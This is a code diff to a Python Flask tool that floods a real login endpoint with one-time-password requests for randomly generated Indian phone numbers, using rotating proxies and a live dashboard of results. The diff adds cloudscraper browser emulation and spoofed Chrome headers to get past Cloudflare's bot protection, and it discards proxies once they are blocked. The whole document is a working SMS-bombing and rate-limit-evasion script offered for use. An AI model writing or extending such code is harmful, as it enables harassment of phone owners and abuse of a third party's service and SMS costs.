@@ -4,6 +4,7 @@ import random
 import json
 import threading
 import requests
+import cloudscraper
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, jsonify, render_template_string, Response
@@ -17,6 +18,7 @@ STATE = {
     "code_200": 0,
     "code_201": 0,
     "code_400": 0,
+    "code_403": 0,
     "code_other": 0,
     "proxies_fetched": 0,
     "proxies_dead": 0,
@@ -110,7 +112,7 @@ def proxy_manager_thread():
         
         time.sleep(5)
 
-# --- OTP WORKER LOGIC (Updated with provided API) ---
+# --- OTP WORKER LOGIC (Updated with Cloudflare bypass) ---
 def otp_worker_thread(worker_id):
     """Worker thread that grabs a proxy and sends OTPs until proxy is blocked."""
     while True:
@@ -128,6 +130,23 @@ def otp_worker_thread(worker_id):
             "https": f"http://{current_proxy}"
         }
 
+        # Create cloudscraper instance for this proxy with browser emulation
+        try:
+            scraper = cloudscraper.create_scraper(
+                browser={
+                    'browser': 'chrome',
+                    'platform': 'windows',
+                    'mobile': False,
+                    'desktop': True
+                },
+                delay=15,
+                interpreter='native'
+            )
+            log_sys(f"[THREAD-{worker_id}] Cloudscraper initialized successfully.", "info", proxy=current_proxy)
+        except Exception as e:
+            log_sys(f"[THREAD-{worker_id}] Cloudscraper init failed: {str(e)}. Falling back to requests.", "warn", proxy=current_proxy)
+            scraper = requests.Session()
+
         # 2. Loop on this specific proxy until it gets blocked
         while True:
             # Generate 10-digit phone number (must start with 6,7,8,9)
@@ -136,24 +155,39 @@ def otp_worker_thread(worker_id):
             # API Endpoint
             send_otp_url = "https://api.clashx24.xyz/user/login-code"
             
-            # Headers from the provided code
+            # Enhanced headers for Cloudflare bypass
             headers = {
                 "accept": "application/json, text/plain, */*",
                 "content-type": "application/json",
-                "user-agent": "okhttp/4.12.0"
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "accept-language": "en-US,en;q=0.9",
+                "accept-encoding": "gzip, deflate, br",
+                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Windows"',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-site",
+                "origin": "https://clashx24.xyz",
+                "referer": "https://clashx24.xyz/",
+                "cache-control": "no-cache",
+                "pragma": "no-cache"
             }
             
-            # Payload from the provided code
-            send_payload = {
-                "phone_number": phone
-            }
+            send_payload = {"phone_number": phone}
 
             STATE["total_attempts"] += 1
             log_sys(f"[THREAD-{worker_id}] Sending OTP to: {phone}", "info", target=phone, proxy=current_proxy)
 
             try:
-                # 3. Send OTP request
-                send_res = requests.post(send_otp_url, json=send_payload, headers=headers, proxies=proxy_dict, timeout=10)
+                # 3. Send OTP request using cloudscraper
+                send_res = scraper.post(
+                    send_otp_url, 
+                    json=send_payload, 
+                    headers=headers, 
+                    proxies=proxy_dict, 
+                    timeout=15
+                )
                 
                 # 4. Handle Server Response
                 if send_res.status_code == 200 or send_res.status_code == 201:
@@ -177,12 +211,22 @@ def otp_worker_thread(worker_id):
                     
                 elif send_res.status_code == 400:
                     STATE["code_400"] += 1
-                    log_sys(f"[THREAD-{worker_id}] ❌ STATUS 400: Rate limited or blocked. Burning proxy.", "error", target=phone, proxy=current_proxy)
+                    log_sys(f"[THREAD-{worker_id}] ❌ STATUS 400: Rate limited or invalid request. Burning proxy.", "error", target=phone, proxy=current_proxy)
                     try:
                         response_json = send_res.json()
                         log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "error", target=phone, proxy=current_proxy)
                     except ValueError:
-                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text}", "error", target=phone, proxy=current_proxy)
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "error", target=phone, proxy=current_proxy)
+                    break  # Burn this proxy, get a new one
+                    
+                elif send_res.status_code == 403:
+                    STATE["code_403"] += 1
+                    log_sys(f"[THREAD-{worker_id}] 🛡️ STATUS 403: Cloudflare blocking this proxy. Burning.", "error", target=phone, proxy=current_proxy)
+                    try:
+                        response_json = send_res.json()
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "error", target=phone, proxy=current_proxy)
+                    except ValueError:
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "error", target=phone, proxy=current_proxy)
                     break  # Burn this proxy, get a new one
                     
                 else:
@@ -192,9 +236,14 @@ def otp_worker_thread(worker_id):
                         response_json = send_res.json()
                         log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "warn", target=phone, proxy=current_proxy)
                     except ValueError:
-                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text}", "warn", target=phone, proxy=current_proxy)
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "warn", target=phone, proxy=current_proxy)
                     break  # Burn this proxy, get a new one
 
+            except cloudscraper.exceptions.CloudflareChallengeError as cf_error:
+                STATE["code_403"] += 1
+                log_sys(f"[THREAD-{worker_id}] 🛡️ CLOUDFLARE CHALLENGE FAILED: {str(cf_error)[:100]}. Burning proxy.", "error", target=phone, proxy=current_proxy)
+                break
+                
             except requests.exceptions.Timeout:
                 log_sys(f"[THREAD-{worker_id}] ⏱️ TIMEOUT: Proxy slow/disconnected. Burning.", "error", target=phone, proxy=current_proxy)
                 break  # Burn this proxy, get a new one
@@ -243,6 +292,7 @@ def stats():
         "code_200": STATE["code_200"],
         "code_201": STATE["code_201"],
         "code_400": STATE["code_400"],
+        "code_403": STATE["code_403"],
         "code_other": STATE["code_other"],
         "total_attempts": STATE["total_attempts"],
         "proxies_fetched": STATE["proxies_fetched"],
@@ -260,6 +310,7 @@ def export_data():
                 "total_200": STATE["code_200"],
                 "total_201": STATE["code_201"],
                 "total_400": STATE["code_400"],
+                "total_403": STATE["code_403"],
                 "total_other": STATE["code_other"],
                 "total_attempts": STATE["total_attempts"],
                 "proxies_fetched": STATE["proxies_fetched"],
@@ -330,6 +381,9 @@ HTML_TEMPLATE = """
 
         .box-green { border-color: #00ff00; color: #00ff00; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
         .box-green .stat-value { text-shadow: 0 0 5px #00ff00; }
+        
+        .box-purple { border-color: #9b59b6; color: #9b59b6; box-shadow: 0 0 10px rgba(155, 89, 182, 0.2); }
+        .box-purple .stat-value { text-shadow: 0 0 5px #9b59b6; }
 
         .terminal-container {
             margin-top: 20px;
@@ -439,6 +493,10 @@ HTML_TEMPLATE = """
             <div>STATUS 400</div>
             <div class="stat-value" id="val_400">0</div>
         </div>
+        <div class="stat-box box-purple">
+            <div>STATUS 403</div>
+            <div class="stat-value" id="val_403">0</div>
+        </div>
         <div class="stat-box">
             <div>OTHER STATUS</div>
             <div class="stat-value" id="val_other">0</div>
@@ -477,6 +535,7 @@ HTML_TEMPLATE = """
                     document.getElementById('val_200').innerText = data.code_200;
                     document.getElementById('val_201').innerText = data.code_201;
                     document.getElementById('val_400').innerText = data.code_400;
+                    document.getElementById('val_403').innerText = data.code_403;
                     document.getElementById('val_other').innerText = data.code_other;
 
                     const tbody = document.getElementById('log_body');
